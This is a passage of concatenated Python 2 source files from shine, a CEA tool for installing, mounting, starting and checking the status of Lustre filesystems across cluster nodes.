                if target.has_upgrade14_flag():
                    flags.append("upgrade14")
                if target.has_param_flag():
                    flags.append("conf_param")

                ldic.append(target_dict([\
                    ["nodes", NodeSet.fromlist(target.servers)],
                    ["dev", target.dev],
                    ["size", dev_size],
                    ["jdev", jdev],
                    ["type", target.type.upper()],
                    ["index", target.index],
                    ["tag", tag],
                    ["label", target.label],
                    ["flags", ' '.join(flags)],
                    ["fsname", target.fs.fs_name],
                    ["status", status]]))

        ldic.sort()
        layout = AsciiTableLayout()
        layout.set_show_header(True)
        i = 0
        layout.set_column("dev", i, AsciiTableLayout.LEFT, "device",
                AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("nodes", i, AsciiTableLayout.LEFT, "node(s)",
                AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("size", i, AsciiTableLayout.RIGHT, "dev size",
                AsciiTableLayout.CENTER)
        if jdev_col_enabled:
            i += 1
            layout.set_column("jdev", i, AsciiTableLayout.RIGHT, "journal device",
                    AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("type", i, AsciiTableLayout.LEFT, "type",
                AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("index", i, AsciiTableLayout.RIGHT, "index",
                AsciiTableLayout.CENTER)
        if tag_col_enabled:
            i += 1
            layout.set_column("tag", i, AsciiTableLayout.LEFT, "tag",
                    AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("label", i, AsciiTableLayout.LEFT, "label",
                AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("flags", i, AsciiTableLayout.LEFT, "ldd flags",
                AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("fsname", i, AsciiTableLayout.LEFT, "fsname",
                AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("status", i, AsciiTableLayout.LEFT, "status",
                AsciiTableLayout.CENTER)

        AsciiTable().print_from_list_of_dict(ldic, layout)


# Umount.py -- Unmount file system on clients
# Copyright (C) 2007, 2008, 2009 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

"""
Shine `umount' command classes.

The umount command aims to stop Lustre filesystem clients.
"""

import os

# Configuration
from Shine.Configuration.Configuration import Configuration
from Shine.Configuration.Globals import Globals 
from Shine.Configuration.Exceptions import *

# Command base class
from Base.FSClientLiveCommand import FSClientLiveCommand
from Base.CommandRCDefs import *
# -R handler
from Base.RemoteCallEventHandler import RemoteCallEventHandler

# Command helper
from Shine.FSUtils import open_lustrefs

# Lustre events
import Shine.Lustre.EventHandler
from Shine.Lustre.FileSystem import *


class GlobalUmountEventHandler(Shine.Lustre.EventHandler.EventHandler):

    def __init__(self, verbose=1):
        self.verbose = verbose

    def ev_stopclient_start(self, node, client):
        if self.verbose > 1:
            print "%s: Unmounting %s on %s ..." % (node, client.fs.fs_name, client.mount_path)

    def ev_stopclient_done(self, node, client):
        if self.verbose > 1:
            if client.status_info:
                print "%s: Umount: %s" % (node, client.status_info)                    
            else:
                print "%s: FS %s succesfully unmounted from %s" % (node,
                        client.fs.fs_name, client.mount_path)

    def ev_stopclient_failed(self, node, client, rc, message):
        if rc:
            strerr = os.strerror(rc)
        else:
            strerr = message
        print "%s: Failed to unmount FS %s from %s: %s" % \
                (node, client.fs.fs_name, client.mount_path, strerr)
        if rc:
            print message


class Umount(FSClientLiveCommand):
    """
    shine umount
    """

    def __init__(self):
        FSClientLiveCommand.__init__(self)

    def get_name(self):
        return "umount"

    def get_desc(self):
        return "Unmount file system clients."

    target_status_rc_map = { \
            MOUNTED : RC_FAILURE,
            RECOVERING : RC_FAILURE,
            OFFLINE : RC_OK,
            TARGET_ERROR : RC_TARGET_ERROR,
            CLIENT_ERROR : RC_CLIENT_ERROR,
            RUNTIME_ERROR : RC_RUNTIME_ERROR }

    def fs_status_to_rc(self, status):
        return self.target_status_rc_map[status]

    def execute(self):
        result = 0

        self.init_execute()

        # Get verbose level.
        vlevel = self.verbose_support.get_verbose_level()

        for fsname in self.fs_support.iter_fsname():

            # Install appropriate event handler.
            eh = self.install_eventhandler(None,
                    GlobalUmountEventHandler(vlevel))

            nodes = self.nodes_support.get_nodeset()

            fs_conf, fs = open_lustrefs(fsname, None,
                    nodes=nodes,
                    indexes=None,
                    event_handler=eh)

            if nodes and not nodes.issubset(fs_conf.get_client_nodes()):
                raise CommandException("%s are not client nodes of filesystem '%s'" % \
                        (nodes - fs_conf.get_client_nodes(), fsname))

            fs.set_debug(self.debug_support.has_debug())

            status = fs.umount()
            rc = self.fs_status_to_rc(status)
            if rc > result:
                result = rc

            if rc == RC_OK:
                if vlevel > 0:
                    print "Unmount successful."                    
            elif rc == RC_RUNTIME_ERROR:
                for nodes, msg in fs.proxy_errors:
                    print "%s: %s" % (nodes, msg)

        return result



# FSProxyAction.py -- Lustre generic FS proxy action class
# Copyright (C) 2009 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

from Shine.Configuration.Globals import Globals
from Shine.Configuration.Configuration import Configuration

from ProxyAction import *

from ClusterShell.NodeSet import NodeSet


class FSProxyAction(ProxyAction):
    """
    Generic file system command proxy action class.
    """

    def __init__(self, fs, action, nodes, debug, targets_type=None, targets_indexes=None):
        ProxyAction.__init__(self)
        self.fs = fs
        self.action = action
        assert isinstance(nodes, NodeSet)
        self.nodes = nodes
        self.debug = debug
        self.targets_type = targets_type
        self.targets_indexes = targets_indexes

        if self.fs.debug:
            print "FSProxyAction %s on %s" % (action, nodes)

    def launch(self):
        """
        Launch FS proxy command.
        """
        command = ["%s" % self.progpath]
        command.append(self.action)
        command.append("-f %s" % self.fs.fs_name)
        command.append("-R")

        if self.debug:
            command.append("-d")

        if self.targets_type:
            command.append("-t %s" % self.targets_type)
            if self.targets_indexes:
                command.append("-i %s" % self.targets_indexes)

        # Schedule cluster command.
        self.task.shell(' '.join(command), nodes=self.nodes, handler=self)

    def ev_read(self, worker):
        node, buf = worker.last_read()
        try:
            event, params = self._shine_msg_unpack(buf)
            self.fs._handle_shine_event(event, node, **params)
        except ProxyActionUnpackError, e:
            # ignore any non shine messages
            pass

    def ev_close(self, worker):
        """
        End of proxy command.
        """
        # Gather nodes by return code
        for rc, nodes in worker.iter_retcodes():
            # rc 127 = command not found
            # rc 126 = found but not executable
            if rc >= 126:                    
                # Gather these nodes by buffer
                for buffer, nodes in worker.iter_buffers(nodes):
                    # Handle proxy command error which rc >= 127 and 
                    self.fs._handle_shine_proxy_error(nodes, "Remote action %s failed: %s" % \
                            (self.action, buffer))

        self.fs.action_refcnt -= 1
        if self.fs.action_refcnt == 0:
            worker.task.abort()


# CommandRegistry.py -- Shine commands registry
# Copyright (C) 2007, 2009 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

# Base command class definition
from Base.Command import Command

# Import list of enabled commands (defined in the module __init__.py)
from Shine.Commands import commandList

from Exceptions import *


# ----------------------------------------------------------------------
# Command Registry
# ----------------------------------------------------------------------


class CommandRegistry:
    """Container object to deal with commands."""

    def __init__(self):
        self.cmd_list = []
        self.cmd_dict = {}
        self.cmd_optargs = {}

        # Autoload commands
        self._load()

    def __len__(self):
        "Return the number of commands."
        return len(self.cmd_list)

    def __iter__(self):
        "Iterate over available commands."
        for cmd in self.cmd_list:
            yield cmd

    # Private methods

    def _load(self):
        for cmdobj in commandList:
            self.register(cmdobj())

    # Public methods

    def get(self, name):
        return self.cmd_dict[name]

    def register(self, cmd):
        "Register a new command."
        assert isinstance(cmd, Command)

        self.cmd_list.append(cmd)
        self.cmd_dict[cmd.get_name()] = cmd

        # Keep an eye on ALL option arguments, this is to insure a global
        # options coherency within shine and allow us to intermix options and
        # command -- see execute() below.
        opt_len = len(cmd.getopt_string)
        for i in range(0, opt_len):
            c = cmd.getopt_string[i]
            if c == ':':
                continue
            has_arg = not (i == opt_len - 1) and (cmd.getopt_string[i+1] == ':')
            if c in self.cmd_optargs:
                assert self.cmd_optargs[c] == has_arg, "Incoherency in option arguments"
            else:
                self.cmd_optargs[c] = has_arg 

    def execute(self, args):
        """
        Execute a shine script command.
        """
        # Get command and options. Options and command may be intermixed.
        command = None
        new_args = []
        try:
            # Find command through options...
            next_is_arg = False
            for opt in args:
                if opt.startswith('-'):
                    new_args.append(opt)
                    next_is_arg = self.cmd_optargs[opt[-1:]]
                elif next_is_arg:
                    new_args.append(opt)
                    next_is_arg = False
                else:
                    if command:
                        # Command has already been found, so?
                        if command.has_subcommand():
                            # The command supports subcommand: keep it in new_args.
                            new_args.append(opt)
                        else:
                            raise CommandHelpException("Syntax error.", command)
                    else:
                        command = self.get(opt)
                    next_is_arg = False
        except KeyError, e:
            raise CommandNotFoundError(opt)

        # Parse
        command.parse(new_args)

        # Execute
        return command.execute()                    


# Install.py -- File system installation commands
# Copyright (C) 2007, 2008, 2009 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

from Shine.Configuration.Configuration import Configuration
from Shine.Configuration.Globals import Globals 

from Shine.FSUtils import create_lustrefs

from Base.Command import Command
from Base.Support.LMF import LMF
from Base.Support.Nodes import Nodes


class Install(Command):
    """
    shine install -f /path/to/model.lmf
    """
    
    def __init__(self):
        Command.__init__(self)

        self.lmf_support = LMF(self)
        self.nodes_support = Nodes(self)

    def get_name(self):
        return "install"

    def get_desc(self):
        return "Install a new file system."

    def execute(self):
        if not self.opt_m:
            print "Bad argument"                    
        else:
            # Use this Shine.FSUtils convenience function.
            fs_conf, fs = create_lustrefs(self.lmf_support.get_lmf_path(),
                    event_handler=self)

            install_nodes = self.nodes_support.get_nodeset()

            # Install file system configuration files; normally, this should
            # not be done by the Shine.Lustre.FileSystem object itself, but as
            # all proxy methods are currently handled by it, it is more
            # convenient this way...
            fs.install(fs_conf.get_cfg_filename(), nodes=install_nodes)

            if install_nodes:
                nodestr = " on %s" %  install_nodes
            else:
                nodestr = ""

            print "Configuration files for file system %s have been installed " \
                    "successfully%s." % (fs_conf.get_fs_name(), nodestr)

            if not install_nodes:
                # Print short file system summary.
                print
                print "Lustre targets summary:"
                print "\t%d MGT on %s" % (fs.mgt_count, fs.mgt_servers)
                print "\t%d MDT on %s" % (fs.mdt_count, fs.mdt_servers)
                print "\t%d OST on %s" % (fs.ost_count, fs.ost_servers)
                print

                # Give pointer to next user step.
                print "Use `shine format -f %s' to initialize the file system." % \
                        fs_conf.get_fs_name()

            return 0                    


# Mount.py -- Mount file system on clients
# Copyright (C) 2007, 2008, 2009 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

"""
Shine `mount' command classes.

The mount command aims to start Lustre filesystem clients.
"""

import os

# Configuration
from Shine.Configuration.Configuration import Configuration
from Shine.Configuration.Globals import Globals 
from Shine.Configuration.Exceptions import *

# Command base class
from Base.FSClientLiveCommand import FSClientLiveCommand
from Base.CommandRCDefs import *
# -R handler
from Base.RemoteCallEventHandler import RemoteCallEventHandler

from Exceptions import CommandException

# Command helper
from Shine.FSUtils import open_lustrefs

# Lustre events
import Shine.Lustre.EventHandler
from Shine.Lustre.FileSystem import *

class GlobalMountEventHandler(Shine.Lustre.EventHandler.EventHandler):

    def __init__(self, verbose=1):
        self.verbose = verbose

    def ev_startclient_start(self, node, client):
        if self.verbose > 1:
            print "%s: Mounting %s on %s ..." % (node, client.fs.fs_name, client.mount_path)

    def ev_startclient_done(self, node, client):
        if self.verbose > 1:
            if client.status_info:
                print "%s: Mount: %s" % (node, client.status_info)                    
            else:
                print "%s: FS %s succesfully mounted on %s" % (node,
                        client.fs.fs_name, client.mount_path)

    def ev_startclient_failed(self, node, client, rc, message):
        if rc:
            strerr = os.strerror(rc)
        else:
            strerr = message
        print "%s: Failed to mount FS %s on %s: %s" % \
                (node, client.fs.fs_name, client.mount_path, strerr)
        if rc:
            print message


class Mount(FSClientLiveCommand):
    """
    """

    def __init__(self):
        FSClientLiveCommand.__init__(self)

    def get_name(self):
        return "mount"

    def get_desc(self):
        return "Mount file system clients."

    target_status_rc_map = { \
            MOUNTED : RC_OK,
            RECOVERING : RC_FAILURE,
            OFFLINE : RC_FAILURE,
            TARGET_ERROR : RC_TARGET_ERROR,
            CLIENT_ERROR : RC_CLIENT_ERROR,
            RUNTIME_ERROR : RC_RUNTIME_ERROR }

    def fs_status_to_rc(self, status):
        return self.target_status_rc_map[status]

    def execute(self):
        result = 0

        self.init_execute()

        # Get verbose level.
        vlevel = self.verbose_support.get_verbose_level()

        for fsname in self.fs_support.iter_fsname():

            # Install appropriate event handler.
            eh = self.install_eventhandler(None,
                    GlobalMountEventHandler(vlevel))

            nodes = self.nodes_support.get_nodeset()

            fs_conf, fs = open_lustrefs(fsname, None,
                    nodes=nodes,
                    indexes=None,
                    event_handler=eh)

            if nodes and not nodes.issubset(fs_conf.get_client_nodes()):
                raise CommandException("%s are not client nodes of filesystem '%s'" % \
                        (nodes - fs_conf.get_client_nodes(), fsname))

            fs.set_debug(self.debug_support.has_debug())

            status = fs.mount(mount_options=fs_conf.get_mount_options())
            rc = self.fs_status_to_rc(status)
            if rc > result:
                result = rc

            if rc == RC_OK:                    
                if vlevel > 0:                    
                    print "Mount successful."                    
            elif rc == RC_RUNTIME_ERROR:                    
                for nodes, msg in fs.proxy_errors:                    
                    print "%s: %s" % (nodes, msg)                    

        return result


# Preinstall.py -- File system installation commands
# Copyright (C) 2007, 2008 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

from Shine.Configuration.Configuration import Configuration
from Shine.Configuration.Globals import Globals 
from Shine.Configuration.Exceptions import *

from Shine.FSUtils import create_lustrefs

from Base.RemoteCommand import RemoteCommand
from Base.Support.FS import FS

import os

class Preinstall(RemoteCommand):
    """
    shine preinstall -f <filesystem name> -R
    """
    
    def __init__(self):
        RemoteCommand.__init__(self)
        self.fs_support = FS(self)

    def get_name(self):
        return "preinstall"

    def get_desc(self):
        return "Preinstall a new file system."

    def is_hidden(self):
        return True

    def execute(self):
        try:
            conf_dir_path = Globals().get_conf_dir()
            if not os.path.exists(conf_dir_path):
                os.makedirs(conf_dir_path, 0755)
        except OSError, ex:
            print "OSError"                    
            raise                    


# Start.py -- Start file system
# Copyright (C) 2007, 2008, 2009 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

"""
Shine `start' command classes.

The start command aims to start Lustre filesystem servers or just some
of the filesystem targets on local or remote servers. It is available
for any filesystems previously installed and formatted.
"""

import os

# Configuration
from Shine.Configuration.Configuration import Configuration
from Shine.Configuration.Globals import Globals 
from Shine.Configuration.Exceptions import *

from Shine.Commands.Status import Status
from Shine.Commands.Tune import Tune

# Command base class
from Base.FSLiveCommand import FSLiveCommand
from Base.FSEventHandler import FSGlobalEventHandler
from Base.CommandRCDefs import *
# -R handler
from Base.RemoteCallEventHandler import RemoteCallEventHandler

# Command helper
from Shine.FSUtils import open_lustrefs

# Lustre events
import Shine.Lustre.EventHandler

# Shine Proxy Protocol
from Shine.Lustre.Actions.Proxies.ProxyAction import *
from Shine.Lustre.FileSystem import *


class GlobalStartEventHandler(FSGlobalEventHandler):

    def __init__(self, verbose=1):
        FSGlobalEventHandler.__init__(self, verbose)

    def handle_pre(self, fs):
        if self.verbose > 0:
            print "Starting %d targets on %s" % (fs.target_count,
                    fs.target_servers)

    def handle_post(self, fs):
        if self.verbose > 0:
            Status.status_view_fs(fs, show_clients=False)

    def ev_starttarget_start(self, node, target):
        # start/restart timer if needed (we might be running a new runloop)
        if self.verbose > 1:
            print "%s: Starting %s %s (%s)..." % (node, \
                    target.type.upper(), target.get_id(), target.dev)
        self.update()

    def ev_starttarget_done(self, node, target):
        self.status_changed = True
        if self.verbose > 1:
            if target.status_info:
                print "%s: Start of %s %s (%s): %s" % \
                        (node, target.type.upper(), target.get_id(), target.dev,
                                target.status_info)
            else:
                print "%s: Start of %s %s (%s) succeeded" % \
                        (node, target.type.upper(), target.get_id(), target.dev)
        self.update()

    def ev_starttarget_failed(self, node, target, rc, message):
        self.status_changed = True
        if rc:
            strerr = os.strerror(rc)
        else:
            strerr = message
        print "%s: Failed to start %s %s (%s): %s" % \
                (node, target.type.upper(), target.get_id(), target.dev,
                        strerr)
        if rc:
            print message
        self.update()


class LocalStartEventHandler(Shine.Lustre.EventHandler.EventHandler):

    def __init__(self, verbose=1):
        self.verbose = verbose

    def ev_starttarget_start(self, node, target):
        if self.verbose > 1:
            print "Starting %s %s (%s)..." % (target.type.upper(),
                    target.get_id(), target.dev)

    def ev_starttarget_done(self, node, target):
        if self.verbose > 1:
            if target.status_info:
                print "Start of %s %s (%s): %s" % (target.type.upper(),
                        target.get_id(), target.dev, target.status_info)
            else:
                print "Start of %s %s (%s) succeeded" % (target.type.upper(),
                        target.get_id(), target.dev)

    def ev_starttarget_failed(self, node, target, rc, message):
        if rc:
            strerr = os.strerror(rc)
        else:
            strerr = message
        print "Failed to start %s %s (%s): %s" % (target.type.upper(),
                target.get_id(), target.dev, strerr)
        if rc:
            print message


class Start(FSLiveCommand):
    """
    shine start [-f <fsname>] [-t <target>] [-i <index(es)>] [-n <nodes>] [-qv]
    """

    def __init__(self):
        FSLiveCommand.__init__(self)

    def get_name(self):
        return "start"

    def get_desc(self):
        return "Start file system servers."

    target_status_rc_map = { \
            MOUNTED : RC_OK,
            RECOVERING : RC_OK,
            OFFLINE : RC_FAILURE,
            TARGET_ERROR : RC_TARGET_ERROR,
            CLIENT_ERROR : RC_CLIENT_ERROR,
            RUNTIME_ERROR : RC_RUNTIME_ERROR }

    def fs_status_to_rc(self, status):
        return self.target_status_rc_map[status]

    def execute(self):
        result = 0

        self.init_execute()

        # Get verbose level.
        vlevel = self.verbose_support.get_verbose_level()

        target = self.target_support.get_target()
        for fsname in self.fs_support.iter_fsname():

            # Install appropriate event handler.
            eh = self.install_eventhandler(LocalStartEventHandler(vlevel),
                    GlobalStartEventHandler(vlevel))

            # Open configuration and instantiate a Lustre FS.
            fs_conf, fs = open_lustrefs(fsname, target,
                    nodes=self.nodes_support.get_nodeset(),
                    indexes=self.indexes_support.get_rangeset(),
                    event_handler=eh)

            # Prepare options...
            mount_options = {}
            mount_paths = {}
            for target_type in [ 'mgt', 'mdt', 'ost' ]:
                mount_options[target_type] = fs_conf.get_target_mount_options(target_type)
                mount_paths[target_type] = fs_conf.get_target_mount_path(target_type)

            fs.set_debug(self.debug_support.has_debug())

            # Will call the handle_pre() method defined by the event handler.
            if hasattr(eh, 'pre'):
                eh.pre(fs)
                
            status = fs.start(mount_options=mount_options,
                              mount_paths=mount_paths)

            rc = self.fs_status_to_rc(status)
            if rc > result:
                result = rc

            if rc == RC_OK:
                if vlevel > 0:
                    print "Start successful."
                tuning = Tune.get_tuning(fs_conf)
                status = fs.tune(tuning)
                if status == RUNTIME_ERROR:
                    rc = RC_RUNTIME_ERROR
                # XXX improve tuning on start error handling

            if rc == RC_RUNTIME_ERROR:
                for nodes, msg in fs.proxy_errors:
                    print "%s: %s" % (nodes, msg)

            if hasattr(eh, 'post'):
                eh.post(fs)

            return rc                    

# Status.py -- Check remote filesystem servers and targets status
# Copyright (C) 2009 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

"""
Shine `status' command classes.

The status command aims to return the real state of a Lustre filesystem
and its components, depending of the requested "view". Status views let
the Lustre administrator to either stand back and get a global status
of the filesystem, or if needed, to enquire about filesystem components
detailed states.
"""

# Configuration
from Shine.Configuration.Configuration import Configuration
from Shine.Configuration.Globals import Globals 
from Shine.Configuration.Exceptions import *

# Command base class
from Base.FSLiveCommand import FSLiveCommand
from Base.CommandRCDefs import *
# Additional options
from Base.Support.View import View
# -R handler
from Base.RemoteCallEventHandler import RemoteCallEventHandler


# Error handling
from Exceptions import CommandBadParameterError

# Command helper
from Shine.FSUtils import open_lustrefs

# Command output formatting
from Shine.Utilities.AsciiTable import *

# Lustre events and errors
import Shine.Lustre.EventHandler
from Shine.Lustre.Disk import *
from Shine.Lustre.FileSystem import *

from ClusterShell.NodeSet import NodeSet

import os


(KILO, MEGA, GIGA, TERA) = (1024, 1048576, 1073741824, 1099511627776)


class GlobalStatusEventHandler(Shine.Lustre.EventHandler.EventHandler):

    def __init__(self, verbose=1):
        self.verbose = verbose

    def ev_statustarget_start(self, node, target):
        pass

    def ev_statustarget_done(self, node, target):
        pass

    def ev_statustarget_failed(self, node, target, rc, message):
        print "%s: Failed to status %s %s (%s)" % (node, target.type.upper(), \
                target.get_id(), target.dev)
        print ">> %s" % message

    def ev_statusclient_start(self, node, client):
        pass

    def ev_statusclient_done(self, node, client):
        pass

    def ev_statusclient_failed(self, node, client, rc, message):
        print "%s: Failed to status of FS %s" % (node, client.fs.fs_name)
        print ">> %s" % message


class Status(FSLiveCommand):
    """
    shine status [-f <fsname>] [-t <target>] [-i <index(es)>] [-n <nodes>] [-qv]
    """

    def __init__(self):
        FSLiveCommand.__init__(self)
        self.view_support = View(self)

    def get_name(self):
        return "status"

    def get_desc(self):
        return "Check for file system target status."


    target_status_rc_map = { \
            MOUNTED : RC_ST_ONLINE,
            RECOVERING : RC_ST_RECOVERING,
            OFFLINE : RC_ST_OFFLINE,
            TARGET_ERROR : RC_TARGET_ERROR,
            CLIENT_ERROR : RC_CLIENT_ERROR,
            RUNTIME_ERROR : RC_RUNTIME_ERROR }

    def fs_status_to_rc(self, status):
        return self.target_status_rc_map[status]

    def execute(self):

        result = -1                    

        self.init_execute()

        # Get verbose level.
        vlevel = self.verbose_support.get_verbose_level()

        target = self.target_support.get_target()
        for fsname in self.fs_support.iter_fsname():

            # Install appropriate event handler.
            eh = self.install_eventhandler(None, GlobalStatusEventHandler(vlevel))

            fs_conf, fs = open_lustrefs(fsname, target,
                    nodes=self.nodes_support.get_nodeset(),
                    indexes=self.indexes_support.get_rangeset(),
                    event_handler=eh)

            fs.set_debug(self.debug_support.has_debug())

            status_flags = STATUS_ANY
            view = self.view_support.get_view()

            # default view
            if view is None:
                view = "fs"
            else:                    
                view = view.lower()

            # disable client checks when not requested
            if view.startswith("disk") or view.startswith("target"):
                status_flags &= ~STATUS_CLIENTS
            # disable servers checks when not requested
            if view.startswith("client"):
                status_flags &= ~(STATUS_SERVERS|STATUS_HASERVERS)

            statusdict = fs.status(status_flags)

            if RUNTIME_ERROR in statusdict:
                # get targets that couldn't be checked
                defect_targets = statusdict[RUNTIME_ERROR]

                for nodes, msg in fs.proxy_errors:
                    print nodes
                    print '-' * 15
                    print msg
                print

            else:                    
                defect_targets = []

            rc = self.fs_status_to_rc(max(statusdict.keys()))
            if rc > result:
                result = rc

            if view == "fs":                    
                self.status_view_fs(fs)                    
            elif view.startswith("target"):                    
                self.status_view_targets(fs)                    
            elif view.startswith("disk"):                    
                self.status_view_disks(fs)                    
            else:                    
                raise CommandBadParameterError(self.view_support.get_view(),                    
                        "fs, targets, disks")                    
        return result

    def status_view_targets(self, fs):
        """
        View: lustre targets
        """
        print "FILESYSTEM TARGETS (%s)" % fs.fs_name

        # override dict to allow target sorting by index
        class target_dict(dict):
            def __lt__(self, other):
                return self["index"] < other["index"]

        ldic = []
        for type, (all_targets, enabled_targets) in fs.targets_by_type():
            for target in enabled_targets:

                if target.state == OFFLINE:
                    status = "offline"
                elif target.state == TARGET_ERROR:
                    status = "ERROR"
                elif target.state == RECOVERING:
                    status = "recovering %s" % target.status_info
                elif target.state == MOUNTED:
                    status = "online"
                else:                    
                    status = "UNKNOWN"

                ldic.append(target_dict([["target", target.get_id()],
                    ["type", target.type.upper()],
                    ["nodes", NodeSet.fromlist(target.servers)],
                    ["device", target.dev],
                    ["index", target.index],
                    ["status", status]]))

        ldic.sort()
        layout = AsciiTableLayout()
        layout.set_show_header(True)
        layout.set_column("target", 0, AsciiTableLayout.LEFT, "target id",
                AsciiTableLayout.CENTER)
        layout.set_column("type", 1, AsciiTableLayout.LEFT, "type",
                AsciiTableLayout.CENTER)
        layout.set_column("index", 2, AsciiTableLayout.RIGHT, "idx",
                AsciiTableLayout.CENTER)
        layout.set_column("nodes", 3, AsciiTableLayout.LEFT, "nodes",
                AsciiTableLayout.CENTER)
        layout.set_column("device", 4, AsciiTableLayout.LEFT, "device",
                AsciiTableLayout.CENTER)
        layout.set_column("status", 5, AsciiTableLayout.LEFT, "status",
                AsciiTableLayout.CENTER)

        AsciiTable().print_from_list_of_dict(ldic, layout)


    def status_view_fs(cls, fs, show_clients=True):
        """
        View: lustre FS summary
        """
        ldic = []

        # targets
        for type, (a_targets, e_targets) in fs.targets_by_type():
            nodes = NodeSet()
            t_offline = []
            t_error = []
            t_recovering = []
            t_online = []
            t_runtime = []
            t_unknown = []
            for target in a_targets:
                nodes.add(target.servers[0])

                # check target status
                if target.state == OFFLINE:
                    t_offline.append(target)
                elif target.state == TARGET_ERROR:
                    t_error.append(target)
                elif target.state == RECOVERING:
                    t_recovering.append(target)
                elif target.state == MOUNTED:
                    t_online.append(target)
                elif target.state == RUNTIME_ERROR:
                    t_runtime.append(target)
                else:                    
                    t_unknown.append(target)

            status = []
            if len(t_offline) > 0:
                status.append("offline (%d)" % len(t_offline))
            if len(t_error) > 0:
                status.append("ERROR (%d)" % len(t_error))
            if len(t_recovering) > 0:
                status.append("recovering (%d) for %s" % (len(t_recovering),
                    t_recovering[0].status_info))
            if len(t_online) > 0:
                status.append("online (%d)" % len(t_online))
            if len(t_runtime) > 0:
                status.append("CHECK FAILURE (%d)" % len(t_runtime))
            if len(t_unknown) > 0:
                status.append("not checked (%d)" % len(t_unknown))

            if len(t_unknown) < len(a_targets):
                ldic.append(dict([["type", "%s" % type.upper()],
                    ["count", len(a_targets)], ["nodes", nodes],
                    ["status", ', '.join(status)]]))

        # clients
        if show_clients:
            (c_ign, c_offline, c_error, c_runtime, c_mounted) = fs.get_client_statecounters()
            status = []
            if c_ign > 0:
                status.append("not checked (%d)" % c_ign)
            if c_offline > 0:
                status.append("offline (%d)" % c_offline)
            if c_error > 0:
                status.append("ERROR (%d)" % c_error)
            if c_runtime > 0:
                status.append("CHECK FAILURE (%d)" % c_runtime)
            if c_mounted > 0:
                status.append("mounted (%d)" % c_mounted)

